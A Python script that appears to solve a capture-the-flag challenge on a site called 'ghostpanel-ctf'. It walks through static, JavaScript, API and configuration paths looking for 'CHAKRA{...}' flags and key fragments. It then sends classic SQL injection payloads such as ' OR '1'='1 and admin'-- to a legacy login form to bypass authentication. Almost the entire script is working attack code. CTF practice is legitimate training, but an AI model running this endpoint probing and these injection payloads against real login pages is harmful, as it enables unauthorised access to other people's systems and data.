import requests, re, base64

BASE = 'https://ghostpanel-ctf.onrender.com'
s = requests.Session()

def clean(html):
    t = re.sub(r'<[^>]+>','',html)
    return re.sub(r'\s+',' ',t).strip()

# Get all images from homepage
r = s.get(BASE, timeout=15)
imgs = re.findall(r'src=["\']([^"\']+\.(?:png|jpg|jpeg|gif|svg|ico|webp)[^"\']*)["\']', r.text, re.I)
print('Images:', imgs)

# Also check legacy-login page for images/hints
r2 = s.get(BASE + '/legacy-login', timeout=12)
imgs2 = re.findall(r'src=["\']([^"\']+)["\']', r2.text)
print('Legacy imgs:', imgs2)

# Check static dir
for p in ['/static/', '/static/img/', '/static/images/', '/static/css/style.css',
          '/static/css/main.css', '/static/data/', '/static/flag.txt']:
    r3 = s.get(BASE + p, timeout=8)
    if r3.status_code == 200:
        print(f'[200] {p}: {clean(r3.text)[:200]}')

# Try XOR with part1_xor_ - look for part2, part3
for p in ['/static/js/config.js', '/static/js/legacy.js', '/static/js/admin.js',
          '/api/fragment', '/api/part2', '/api/part3', '/legacy-api',
          '/admin/config', '/config.json', '/.well-known/security.txt',
          '/static/employees.jpg', '/static/ghost.png', '/static/admin.jpg',
          '/employees', '/staff', '/users']:
    r4 = s.get(BASE + p, timeout=8)
    if r4.status_code == 200:
        flags = re.findall(r'CHAKRA\{[^}]+\}', r4.text)
        frag = re.findall(r'part\d[_a-zA-Z0-9]+', r4.text)
        print(f'[200] {p}: {clean(r4.text)[:200]} | frags={frag} | flags={flags}')

# Try legacy login with SQLi
print('\n=== SQLi on legacy-login ===')
sqli_payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--", "' OR ''='"]
for sql in sqli_payloads:
    r5 = s.post(BASE + '/legacy-login', data={'username': sql, 'password': sql}, timeout=8, allow_redirects=True)
    flags5 = re.findall(r'CHAKRA\{[^}]+\}', r5.text)
    if flags5 or (r5.url != BASE+'/legacy-login' and 'login' not in r5.url):
        print(f'HIT [{sql}]: {r5.url}')
        print(clean(r5.text)[:400])
        if flags5: print('FLAG:', flags5)
    else:
        err = re.search(r'error|invalid|wrong|denied', r5.text, re.I)
        print(f'[{sql[:20]}]: url={r5.url.split("/")[-1]} err={err.group() if err else "none"}')
